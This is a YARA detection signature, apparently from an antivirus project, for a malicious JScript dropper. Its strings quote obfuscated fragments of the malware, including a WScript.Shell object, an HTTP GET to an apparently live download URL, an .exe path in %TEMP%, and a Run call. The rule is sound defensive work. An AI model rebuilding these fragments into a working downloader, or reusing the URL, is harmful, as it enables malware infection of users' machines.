rule sig_20160401_4677f68be3a76591b6828e93aa3ae00a {
  meta:
    description = "datamaliciousorder - file 20160401_4677f68be3a76591b6828e93aa3ae00a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "989621b1cf33b96927d685a3a96aca2137ee1d65a55fa10d019fb27d715acc83"

  strings:
    $s1  = "var GgyYqb = function WxZk() {return WScript[WoPt](\"WScript\"+\".Shell\");}(), BzLle = 11;" fullword ascii
    $s2  = "function XsGk(MuuNxw, DdbSdg){SbkWj = SbkWj * 1; return MuuNxw - DdbSdg;};" fullword ascii
    $s3  = "UlcKpj[LawWy](\"G\" + \"ET\", \"http://asengineeringworks.in/n9wqo\", false);" fullword ascii
    $s4  = "if (UlcKpj[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function JauQev() {return GgyYqb[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"3MFJTalZa.ex\" + \"e\";};" fullword ascii
    $s6  = "function DioZiv(){return QoIa + \"\";};" fullword ascii
    $s7  = "function LxXhv() {return ((KiQi == true) && (KiQi == SoMhf)) ? 1 : SbkWj;};" fullword ascii
    $s8  = "function QahEl(WpCqu) {var HuDex = (1, 2, 3, 4, 5, WpCqu); return HuDex;};" fullword ascii
    $s9  = "function LvAx()" fullword ascii
    $s10 = "return XsGk(DeoGtm, EfjOpl);" fullword ascii
    $s11 = "function TtXop(){return WoPt;};" fullword ascii
    $s12 = "SoMhf = true; " fullword ascii
    $s13 = "var NwfBzk = new this[\"Date\"]();" fullword ascii
    $s14 = "}while (QlCsj);" fullword ascii
    $s15 = "var SoMhf = false;" fullword ascii
    $s16 = "var KiQi = false;" fullword ascii
    $s17 = "function MsdAt(){return 23;};" fullword ascii
    $s18 = "function JsMj(FbsJy){GgyYqb[\"R\"+\"un\"](FbsJy, SbkWj, SbkWj);};" fullword ascii
    $s19 = "KiQi = true; " fullword ascii
    $s20 = "var AhLh = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}